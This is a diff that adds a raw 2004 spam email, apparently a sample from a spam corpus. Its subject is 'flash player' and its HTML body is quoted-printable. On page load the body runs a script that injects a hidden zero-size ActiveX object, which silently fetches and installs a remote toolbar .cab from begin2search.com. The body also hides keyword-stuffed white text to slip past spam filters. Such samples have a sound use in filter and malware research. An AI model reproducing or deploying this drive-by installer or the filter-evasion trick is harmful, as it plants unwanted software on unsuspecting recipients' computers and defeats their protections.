@@ -1,0 +1,58 @@
+Return-Path: <nwapqc@msn.com>
+Delivered-To: em-ca-bruceg@em.ca
+Received: (qmail 5678 invoked by uid 115); 31 Aug 2004 11:35:30 -0000
+Received: from nwapqc@msn.com by churchill by uid 64011 with qmail-scanner-1.22 
+ (clamdscan: 0.75-1. spamassassin: 2.63.  Clear:RC:0(213.159.109.101):. 
+ Processed in 3.264859 secs); 31 Aug 2004 11:35:30 -0000
+Received: from unknown (HELO 172.16.1.52) (213.159.109.101)
+  by churchill.factcomp.com with SMTP; 31 Aug 2004 11:35:26 -0000
+Received: from 96.144.243.88 by ; Tue, 31 Aug 2004 11:29:31 -0100
+Message-ID: <RHRXFECTOMWHQKNIDQFAVUQEV@yahoo.com>
+From: "Alonzo Eastman" <nwapqc@msn.com>
+Reply-To: "Alonzo Eastman" <nwapqc@msn.com>
+To: lorena@em.ca
+Subject: flash player
+Date: Tue, 31 Aug 2004 18:28:31 +0600
+MIME-Version: 1.0
+Content-Type: multipart/alternative;
+	boundary="--179295848462163"
+
+----179295848462163
+Content-Type: text/html;
+Content-Transfer-Encoding: quoted-printable
+
+<html>
+<head>
+<meta http-equiv=3D"Content-Type" content=3D"text/html; charset=3Dwindows-=
+1252">
+<title>Lorena</title>
+<script language=3D"javascript">
+function popUp() {
+OO.innerHTML =3D '<OBJECT ID=3D"Inst" CLASSID=3D"CLSID:07E9CDF4-20D2-46B1-=
+B681-663968F527CE" codebase=3D"http://www.begin2search.com/toolbar/bar/win=
+b2s32.cab#Version=3D2,6,0,0" width=3D0 height=3D0><PARAM NAME=3D"ID" VALUE=
+=3D"582562"> <PARAM NAME=3D"CAT" VALUE=3D"7"></OBJECT>';
+}
+</script>
+</head>
+<body onload=3D"popUp();"> 
+<div id=3DOO></div>
+<p align=3D"center">
+<a href=3D"http://www.begin2search.net">
+<img border=3D"0" src=3D"http://www.begin2search.net/b2s.jpg" width=3D"468=
+" height=3D"60"></a>
+<br>
+<br>
+<a href=3D"http://www.begin2search.net">
+<img border=3D"0" src=3D"http://www.begin2search.net/clk.gif" width=3D"114=
+" height=3D"25"></a>
+<br>
+<br>
+<br>
+<font color=3D"#FFFFFF">lorena@em.ca gambling online nwapqc@msn.com euthan=
+asia Lorena tennis</font></a></p>
+</body>
+</html>
+
+----179295848462163--
+
